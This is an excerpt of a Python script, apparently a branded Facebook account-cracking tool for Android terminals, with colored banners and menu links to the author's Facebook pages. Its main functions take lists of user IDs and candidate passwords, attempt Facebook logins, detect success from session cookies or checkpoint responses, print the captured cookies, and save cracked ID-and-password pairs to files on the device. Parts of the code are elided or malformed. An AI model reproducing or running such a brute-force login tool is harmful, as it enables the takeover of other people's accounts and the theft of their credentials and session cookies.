...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mBaba jutt')
...
           
      ...
      \033[1;91m<\033[1;41m\033[1;97m THIS NAME IS SELIM HASAN BRAND\033[;0m\033[1;91m>\033[1;92m                                            
\033[1;32m
\033[3;30m\033[2;37mFr\033[2;31mee \033[2;37mVers\033[2;36mi\033[2;37mon \033[2;34m0.1\x1b[0m
\033[38;5;96m\033[47m  \x1b[0m\033[38;5;196m DEVELOPER   :   Selim
\033[38;5;97m\033[47m  \x1b[0m\033[38;5;197m GITHUB      :   Selim560278
\033[38;5;98m\033[47m  \x1b[0m\033[38;5;198m POWER BY    :   Selim\033[1;30m
\033[1;32m""")
...
def mainx():
    ...
    if mahin in ["0","07"]:
     ...
     os.system("xdg-open https://www.facebook.com/profile.php?id=61552012478362");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-Baba jutt {P}Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=61552012478362");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.PARVEZ.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/profile.php?id=61552012478362");mainx()
def mainx2():
    os.system("clear")
    banner()
    linex1()
...
# FILE CRACK -- MAIN DEF #
def cr():
            os.system('clear');banner();print(f'{dot}EXAMPLE :  /sdcard/Baba jutt.txt{P}{H}{P} ');time.sleep(0.05);linex3()
            try:
...
def m5(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32Baba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt","\33[1;32mBaba jutt"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P}[\033[1;28Selim Hasan{P}] \033[1;28m{idf} • {pw}{xxx}')
             open(' /sdcard/Selim Hasan-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P}[{H}Selim-OK{P}] {GREEN}{idf} • {pw}{xxx}');linex3()
                if 'y' in cokix:
                 print(f'\r\33[1;92m[COOKIES] = {H}'+kukis);linex3()
                open(' /sdcard/Selim-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
...
def m3(idf,pw):
 ...
 global ok
 global agents
 animasi = random.choice(["\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasat","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan","\33[1;32mSelim Hasan"])
 sys.stdout.write(f'\r{P}[{animasi}{H}{P}] [{B}%s{P}]{U}- -{H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m[Selim-OK] '+user+' • '+ps)
    if 'y' in cokix:
     print(f'\33[1;92m[COOKIES] = {H}'+coki)
     linex3()
    ok+=1 
    open(' /sdcard/Selim Hasan-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P}[\033[1;30mSelim Hasan-CP{P}] \033[1;30m{idf} • {ps}{xxx}')
    open(' /sdcard/Selim Hasan-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
